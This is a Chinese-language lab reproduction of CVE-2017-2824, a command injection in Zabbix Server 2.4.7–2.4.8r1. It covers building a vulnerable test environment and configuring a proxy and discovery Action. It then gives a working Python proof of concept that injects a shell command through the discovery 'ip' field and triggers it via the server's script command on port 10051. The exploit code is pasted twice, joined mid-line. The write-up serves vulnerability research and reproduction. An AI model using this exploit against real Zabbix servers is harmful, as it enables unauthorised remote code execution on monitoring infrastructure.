Zabbix 是一种企业监控解决方案，旨在使组织能够监控其网络中各种系统的健康状况和状态，包括：网络服务，服务器和网络设备。前些日子 Lilith Wyatt of Cisco ASIG 发现利用命令注入的形式可以在 Zabbix Server 上实现远程代码执行，影响的版本为 Zabbix 2.4.7 – 2.4.8r1
0. 前言
-----
Zabbix 是一种企业监控解决方案，旨在使组织能够监控其网络中各种系统的健康状况和状态，包括：网络服务，服务器和网络设备。前些日子 Lilith Wyatt of Cisco ASIG 发现利用命令注入的形式可以在 Zabbix Server 上实现远程代码执行，影响的版本为`Zabbix 2.4.7 – 2.4.8r1`。在复现过程中发现利用条件比较苛刻，首先需要能访问到 Zabbix Server 监听的 10051 端口，另外需要配置 Proxy，以及相应的 Action 来自动添加 Host，从而达到利用 ip 参数进行命令注入。
1. 基础工作
-------
下载 centos7 用 virtualbox 进行运行，接下来就是安装 php mysql apache 等相关基础运行环境。关闭 SELinux 和防火墙以及启动 httpd,mariadb。添加 zabbix 组和用户，zabbix_server 组件默认会用 zabbix 用户启动
```
yum install php php-mysql php-gd php-pear mariadb-server mariadb
systemctl start mariadb
systemctl start httpd
systemctl stop firewalld.service
setenforce 0
groupadd zabbix
useradd -g zabbix zabbix
```
2. 编译安装 Zabbix
--------------
### 2.1 下载有漏洞的版本
```
wget [https://nchc.dl.sourceforge.net/project/zabbix/ZABBIX%20Latest%20Stable/2.4.7/zabbix-2.4.7.tar.gz](https://nchc.dl.sourceforge.net/project/zabbix/ZABBIX%20Latest%20Stable/2.4.7/zabbix-2.4.7.tar.gz)
```
### 2.2 安装依赖
```
yum install -y curl curl-devel mydql-devel net-snmp snmp net-snmp-devel perl-DBI php-gd php-xml php-bcmath php-mbstring php-ldap php-odbc php-xmlrpc
```
### 2.3 编译并安装
可以修改 --prefix 参数来选择安装目录
```
tar -xvf zabbix-2.4.7.tar.gz
cd zabbix-2.4.7/
./configure --prefix=/usr/local/zabbix --enable-server --enable-agent --enable-proxy --with-mysql --enable-net-snmp --with-libcurl 
make
make install
```
### 2.4 导入数据
```
mysql -uroot
>create database zabbix character set utf8 collate utf8_bin;
>use zabbix;
>source /root/zabbix-2.4.7/database/mysql/schema.sql
>source /root/zabbix-2.4.7/database/mysql/images.sql
>source /root/zabbix-2.4.7/database/mysql/data.sql
```
3. 安装 Zabbix　Web 界面
-------------------
### 3.1 复制 PHP 文件到 web 目录
```
mkdir /var/www/html/t
cd frontends/php
cp -a . /var/www/html/t
cd /var/www/html/t
chown apache:apache -R .
```
### 3.2 修改 php.ini
由于访问 setup.php 时需要符合一定的配置
```
post_max_size = 16M
max_execution_time = 300
max_input_time = 300
date.timezone = Asia/Shanghai
allow_url_fopen = On
```
### 3.3 安装前端
访问虚拟机的 80 端口进行安装，安装后默认登录凭证是`Admin/zabbix`
![](/Users/seven/Desktop/pocs/http/zabbix/CVE-2017-2824/CVE-2017-2824.assets/20170502-ddc529ef374a59d46e2e0740b851dee2.png!small)
4 漏洞复现
------
### 4.1 添加 proxy
Administration > proxies > Create proxy
记下填写的 name
### 4.2 创建 Action
configuration > action > Event source(Discovery)> Create Action 配置好条件和操作，操作为 Add host
![](/Users/seven/Desktop/pocs/http/zabbix/CVE-2017-2824/CVE-2017-2824.assets/20170502-36e1ad9d47ba38022769be1493bd344b.png!small)
![](/Users/seven/Desktop/pocs/http/zabbix/CVE-2017-2824/CVE-2017-2824.assets/20170502-94a4fb8e97cb9fbe2d622a3a90c0a598.png!small)
### 4.3 触发漏洞
当 zabbix_server 启动时会监听在 10051 端口，该端口如果对外开放，攻击者可以利用 zabbix 协议的`command`功能调用数据库中特定的脚本，只需要提供 interface 表中的 hostid 参数。在调用脚本时，`{HOST.CONN}`会被替换成表中的 ip。由于插入的 ip 数据没有被过滤则将发生命令注入，严重时可以反弹`shell`等。默认情况下，未经身份验证 (需通过 Zabbix 授权) 的攻击者无法做到这一点。要利用该漏洞还需要以下条件：配置好 Action 的自动发现功能，该功能可以将恶意的数据插入到`interface`表 (配合`Add host`操作)，从而可以进行命令注入攻击。

```python
import socket
import struct
import json
ZABBIX_HOST = "192.168.1.12"
ZABBIX_PORT = 10051
def send_to_zabbix(data):
    client = socket.socket()
    client.connect((ZABBIX_HOST,ZABBIX_PORT))
    packet = "ZBXDx01" + struct.pack('<Q', len(data)) + data
    client.sendall(packet)
    head = client.recv(1024)
    if "ZBXD" not in head:
        client.close()
        return head
    pkt_len = struct.unpack('<Q', client.recv(8))
    data = client.recv(pkt_len[0])
    client.close()
    return data
data = """{"request":"command","scriptid":1,"hostid":10107}"""
discovery = """{
        "request": "discovery data",
    "host": "test",
    "clock":1485353070,
    "data": [
            {
                "clock":1485353070,
            "drule":2,
            "dcheck":2,
            "type":0,
            "ip":";whoami > /tmp/pwned;",        
            "dns":"abc.com.cc",
            "port":10050,
            "key":"zzztest",
            "status":0,
            "value":"fuck"
        }
    ]
    }
"""
#利用自动发现功能添加Host
#可以‘select * from interface;’ 查看是否自动添加成功
print send_to_zabbix(discovery)
#利用命令注入进行攻击
# scriptid == 1 == /bin/ping -c {HOST.CONN} 2>&1
print send_to_zabbix(data)import socket
import struct
import json
ZABBIX_HOST = "192.168.1.12"
ZABBIX_PORT = 10051
def send_to_zabbix(data):
    client = socket.socket()
    client.connect((ZABBIX_HOST,ZABBIX_PORT))
    packet = "ZBXDx01" + struct.pack('<Q', len(data)) + data
    client.sendall(packet)
    head = client.recv(1024)
    if "ZBXD" not in head:
        client.close()
        return head
    pkt_len = struct.unpack('<Q', client.recv(8))
    data = client.recv(pkt_len[0])
    client.close()
    return data
data = """{"request":"command","scriptid":1,"hostid":10107}"""
discovery = """{
        "request": "discovery data",
    "host": "test",
    "clock":1485353070,
    "data": [
            {
                "clock":1485353070,
            "drule":2,
            "dcheck":2,
            "type":0,
            "ip":";whoami > /tmp/pwned;",        
            "dns":"abc.com.cc",
            "port":10050,
            "key":"zzztest",
            "status":0,
            "value":"fuck"
        }
    ]
    }
"""
#利用自动发现功能添加Host
#可以‘select * from interface;’ 查看是否自动添加成功
print send_to_zabbix(discovery)
#利用命令注入进行攻击
# scriptid == 1 == /bin/ping -c {HOST.CONN} 2>&1
print send_to_zabbix(data)
```



`hostid`添加到`interface`表后需要自己查看修改。
![](/Users/seven/Desktop/pocs/http/zabbix/CVE-2017-2824/CVE-2017-2824.assets/20170502-adcc75f12d6f320d3c8d7c5e12a210cc.png!small)
运行后可以看到生成了`/tmp/pwned`文件
![](/Users/seven/Desktop/pocs/http/zabbix/CVE-2017-2824/CVE-2017-2824.assets/20170502-62f69031364160759a81a5a9e33d57ab.png!small)
5. 参考
-----
[https://www.zabbix.com/documentation/2.4/manual/installation/install](https://www.zabbix.com/documentation/2.4/manual/installation/install) [https://support.zabbix.com/browse/ZBX-12075](https://support.zabbix.com/browse/ZBX-12075) [https://www.zabbix.com/documentation/1.8/protocols](https://www.zabbix.com/documentation/1.8/protocols) [http://www.cnblogs.com/xqzt/p/5126523.html](http://www.cnblogs.com/xqzt/p/5126523.html)